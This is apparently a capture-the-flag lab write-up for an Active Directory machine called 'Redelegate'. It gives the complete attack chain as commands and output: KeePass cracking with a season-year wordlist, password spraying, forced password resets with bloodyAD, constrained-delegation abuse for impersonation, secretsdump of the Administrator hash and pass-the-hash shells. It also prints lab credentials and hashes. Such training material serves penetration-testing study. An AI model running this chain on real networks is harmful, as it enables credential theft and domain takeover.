## Redelegate

### Lab Details 

- Difficulty: Hard
- Type: Constrained Delegation Attack, Active Directory, Windows

#### Enumeration
- run `nmap`
```bash
$ nmap 10.129.234.50 -p- -T4 --min-rate 1000 -sC -A
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-13 07:19 CDT
Warning: 10.129.234.50 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.234.50
Host is up (0.0019s latency).
Not shown: 65170 closed tcp ports (reset), 336 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 10-20-24  01:11AM                  434 CyberAudit.txt
| 10-20-24  05:14AM                 2622 Shared.kdbx
|_10-20-24  01:26AM                  580 TrainingAgenda.txt
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-13 12:20:19Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.234.50:1433: 
|     Target_Name: REDELEGATE
|     NetBIOS_Domain_Name: REDELEGATE
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: redelegate.vl
|     DNS_Computer_Name: dc.redelegate.vl
|     DNS_Tree_Name: redelegate.vl
|_    Product_Version: 10.0.20348
|_ssl-date: 2025-10-13T12:21:26+00:00; +1s from scanner time.
| ms-sql-info: 
|   10.129.234.50:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-13T12:17:46
|_Not valid after:  2055-10-13T12:17:46
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: REDELEGATE
|   NetBIOS_Domain_Name: REDELEGATE
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: redelegate.vl
|   DNS_Computer_Name: dc.redelegate.vl
|   DNS_Tree_Name: redelegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-10-13T12:21:17+00:00
| ssl-cert: Subject: commonName=dc.redelegate.vl
| Not valid before: 2025-10-12T12:15:10
|_Not valid after:  2026-04-13T12:15:10
|_ssl-date: 2025-10-13T12:21:26+00:00; +1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49932/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.234.50:49932: 
|     Target_Name: REDELEGATE
|     NetBIOS_Domain_Name: REDELEGATE
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: redelegate.vl
|     DNS_Computer_Name: dc.redelegate.vl
|     DNS_Tree_Name: redelegate.vl
|_    Product_Version: 10.0.20348
| ms-sql-info: 
|   10.129.234.50:49932: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 49932
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-13T12:17:46
|_Not valid after:  2055-10-13T12:17:46
|_ssl-date: 2025-10-13T12:21:26+00:00; +1s from scanner time.
56699/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
56700/tcp open  msrpc         Microsoft Windows RPC
56706/tcp open  msrpc         Microsoft Windows RPC
56716/tcp open  msrpc         Microsoft Windows RPC
56718/tcp open  msrpc         Microsoft Windows RPC
59090/tcp open  msrpc         Microsoft Windows RPC
```
- found hosts
```bash
dc.redelegate.vl
redelegate.vl
```
- visiting port 80, displays default `IIS` page
- port 139/445, anonymous access is not allowed
- port 49932 `mssql` is external facing
- port 1433/3389 `rdp` is external facing
- port 21, anonymous access is allowed
- proceed with further enumeration 
```
$ ftp 10.129.234.50
Connected to 10.129.234.50.
220 Microsoft FTP Service
Name (10.129.234.50:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||62933|)
150 Opening ASCII mode data connection.
10-20-24  01:11AM                  434 CyberAudit.txt
10-20-24  05:14AM                 2622 Shared.kdbx
10-20-24  01:26AM                  580 TrainingAgenda.txt
```
- download all remote files and investigate further
- `TrainingAgenda.txt` contains password like string `SeasonYear!`
```txt
Friday 18th October | 11.30 - 13.30 - 7 attendees
"Weak Passwords" - Why "SeasonYear!" is not a good password 
```
- `CyberAudit.txt` states that remove unused objects in domain is still in progress as well as recheck `acls`, could be useful info later on
- `Shared.kdbx` is a `keepass` file, we can attempt to decrypt it
#### Initial Foothold 
- from `TrainingAgenda.txt` we know that the format `SeasonYear!` is explicitly mentioned as not a secure format 
- thus we can attempt to generate a list of passwords to match that format
- use below script to generate password with year from `2000-current`
```python
$ cat generate_password.py 
from datetime import datetime

seasons= ['Spring','Summer','Fall','Winter']

for year in range(2000,datetime.now().year+1):
    for searson in seasons:
        with open ("passwords.txt", "a") as file:
            password = searson + str(year)+'!'
            file.write(password+"\n")
        print (searson + str(year)+'!')
```
- after generating the password list we can attempt to crack it with `john`
```bash
$ john hash --wordlist=./passwords.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 600000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:04 DONE (2025-10-13 08:14) 0g/s 25.99p/s 25.99c/s 25.99C/s Spring2024!
Session completed. 
```
- we get password `Fall2024!` for the `keepass` file
- ensure `Shared.kdbx` is downloaded with `Binary Mode` from `ftp`
- we can fetch the data using `kpcli`
```bash
$ kpcli --kdb=Shared.kdbx
Provide the master password: *************************

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> ls
=== Groups ===
Shared/
kpcli:/> cd Shared/
kpcli:/Shared> ls
=== Groups ===
Finance/
HelpDesk/
IT/
```
- dumping the credentials in the `keepass` file
```
## credentials in Shared.kbdx

## IT
SQL Guest Access
SQLGuest:zDPBpaF4FywlqIv11vii

FS01 Admin
Administrator:Spdv41gg4BlBgSYIW1gF

Web01 
WordPress Panel:cn4KOEgsHqvKXPjEnSD9

## HelpDesk
KeyFob Combination
NO USERNAME: 22331144

## Finance
Payrol App
Payroll:cVkqz4bCM7kJRSNlgx2G

Timesheet Manager
Timesheet:hMFS4I0Kj8Rcd62vqi5X
```
- store them into `users` and `passwords` lists
```bash
$ cat users.txt 
SQLGuest
Administrator
WordPress Panel
Payroll
Timesheet

$ cat passwords.txt 
zDPBpaF4FywlqIv11vii
Spdv41gg4BlBgSYIW1gF
cn4KOEgsHqvKXPjEnSD9
cVkqz4bCM7kJRSNlgx2G
hMFS4I0Kj8Rcd62vqi5X
```
- perform password spay 
```bash
$ nxc mssql 10.129.234.50 -u users.txt -p passwords.txt --continue-on-success --local-auth
MSSQL       10.129.234.50   1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
MSSQL       10.129.234.50   1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii 
```
- we get access to `SQLGuest`
- we can use `auxiliary/admin/mssql/mssql_enum_domain_accounts` from `mfsconsole` to enumerate for domain users
```bash
msf6 > use auxiliary/admin/mssql/mssql_enum_domain_accounts
msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > set rhost 10.129.234.50
rhost => 10.129.234.50
msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > set rport 1433
rport => 1433
msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > set password zDPBpaF4FywlqIv11vii
password => zDPBpaF4FywlqIv11vii
msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > set username SQLGuest
username => SQLGuest
msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > set fuzznum 9999
```
- save it to a file
```bash
$ cat dc_users.txt 
Christine.Flanders
Marie.Curie
Helen.Frost
Michael.Pontiac
Mallory.Roberts
James.Dinkleberg
Helpdesk
IT
Finance
DnsAdmins
DnsUpdateProxy
Ryan.Cooper
sql_svc

```
- password spray again against found domain users
- we get credential for `Marie.Curie:Fall2024! `
```bash
$ nxc ldap  10.129.234.50 -u dc_users.txt -p Fall2024! --continue-on-success
SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)
LDAP        10.129.234.50   389    DC               [-] redelegate.vl\Christine.Flanders:Fall2024! 
LDAP        10.129.234.50   389    DC               [+] redelegate.vl\Marie.Curie:Fall2024! 
LDAP        10.129.234.50   389    DC               [-] redelegate.vl\Helen.Frost:Fall2024! 
LDAP        10.129.234.50   389    DC               [-] redelegate.vl\Michael.Pontiac:Fall2024! 
LDAP        10.129.234.50   389    DC               [-] redelegate.vl\Mallory.Roberts:Fall2024! 
LDAP        10.129.234.50   389    DC               [-] redelegate.vl\James.Dinkleberg:Fall2024! 
LDAP        10.129.234.50   389    DC               [-] redelegate.vl\Helpdesk:Fall2024! 
LDAP        10.129.234.50   389    DC               [-] redelegate.vl\IT:Fall2024! 
LDAP        10.129.234.50   389    DC               [-] redelegate.vl\Finance:Fall2024! 
LDAP        10.129.234.50   389    DC               [-] redelegate.vl\DnsAdmins:Fall2024! 
LDAP        10.129.234.50   389    DC               [-] redelegate.vl\DnsUpdateProxy:Fall2024! 
LDAP        10.129.234.50   389    DC               [-] redelegate.vl\Ryan.Cooper:Fall2024! 
LDAP        10.129.234.50   389    DC               [-] redelegate.vl\sql_svc:Fall2024!
```
#### Lateral Movement (If any)
- run `bloodhound-python` with `Marie.Curie`'s credential
![[marie curie access.png]]
- we see that we can perform password change to user `Helen Frost` since we are part of `HelpDesk` group
- first we will need to get `TGT` for as `Marie.Curie` then change the password using `bloodyAD`
```bash
## get `TGT` then set password
$ impacket-getTGT redelegate.vl/marie.curie:'Fall2024!'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
[*] Saving ticket in marie.curie.ccache
```
- set password using `bloodyAD`
```bash
$ git clone https://github.com/CravateRouge/bloodyAD.git
$ export KRB5CCNAME=../marie.curie.ccache; python3 bloodyAD.py -d redelegate.vl -k --host "dc.redelegate.vl" set password "HELEN.FROST" 'password123!'
[+] Password changed successfully!
```
- we have reverse shell access as `Helen Frost` via `evil-winrm`
```bash
$ evil-winrm -i 10.129.234.50 -u HELEN.Frost -p 'password123!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents>
```
#### Privilege Escalation
- check `Helen.Frost`'s access we can see that we have generic all access over the machine account `FS01`
![[helen frost access.png]]
- we can perform a constraint delegation account
- conditions met:
	- user `Helen Frost` has `GenericAll` access over `FS01`
	- Ability to set the `TRUSTED_TO_AUTH_FOR_DELEGATION UAC` flag
	- Ability to set the `msDS-AllowedToDelegateTo attribute`
	- Know valuable target Service Principal Names in this case `cifs` (for file share) or `ldap` for AD database
```bash
## HELEN.FROST has GenericAll over `FS01` (Machine account)
$ impacket-getTGT redelegate.vl/HELEN.FROST:'password123!'
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in HELEN.FROST.ccache

## change password of `FS01`
$ export KRB5CCNAME=HELEN.FROST.ccache; python3 ./bloodyAD.py -d redelegate.vl -k --host "dc.redelegate.vl" set password "FS01$" 'password123!'
[+] Password changed successfully!

## adding TRUSTED_TO_AUTH_FOR_DELEGATION UAC flag to `FS01$`, we can do it because we can using kerberos authentication ticket of HELEN.FROST
$ python3 ./bloodyAD.py -d redelegate.vl -k --host "dc.redelegate.vl" add uac FS01$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
[+] ['TRUSTED_TO_AUTH_FOR_DELEGATION'] property flags added to FS01$ userAccountControl

## set allowedtodelegateto from FS01$ to cifs/dc.redelegate.vl
$ python3 ./bloodyAD.py -d redelegate.vl -k --host "dc.redelegate.vl" set object FS01$ msDS-AllowedToDelegateTo -v 'cifs/dc.redelegate.vl'
[+] FS01$s msDS-AllowedToDelegateTo has been updated

## get service ticket of cifs/dc.redelegate.vl 
$ impacket-getST redelegate.vl/fs01\$:'password123!' -spn cifs/dc.redelegate.vl -impersonate dc
```
- if error states `KRB_AP_ERR_BADMATCH` ensure there is no certificate thats being used 
```bash
$ impacket-getST redelegate.vl/fs01\$:'password123!' -spn cifs/dc.redelegate.vl -impersonate dc
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating dc
[*] 	Requesting S4U2self
[-] Kerberos SessionError: KRB_AP_ERR_BADMATCH(Ticket and authenticator dont match)

$ klist
klist: No credentials cache found (filename: /tmp/krb5cc_1002)
```
- dump admin hash using `impacket-secretsdump`
```bash
## dumping dc user admin hash using dc ccache file from above
impacket-secretsdump -k dc.redelegate.vl -just-dc-user Administrator 
##
$ export KRB5CCNAME=./dc.ccache

$ impacket-secretsdump -k dc.redelegate.vl -just-dc-user Administrator 
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ec17f7a2a4d96e177bfd101b94ffc0a7:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:db3a850aa5ede4cfacb57490d9b789b1ca0802ae11e09db5f117c1a8d1ccd173
Administrator:aes128-cts-hmac-sha1-96:b4fb863396f4c7a91c49ba0c0637a3ac
Administrator:des-cbc-md5:102f86737c3e9b2f
[*] Cleaning up... 
```
- get reverse shell access as admin using the `RC4` hash
```bash
$ evil-winrm -i redelegate.vl -u Administrator -H ec17f7a2a4d96e177bfd101b94ffc0a7
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```
#### Resources

#### Lesson Learned
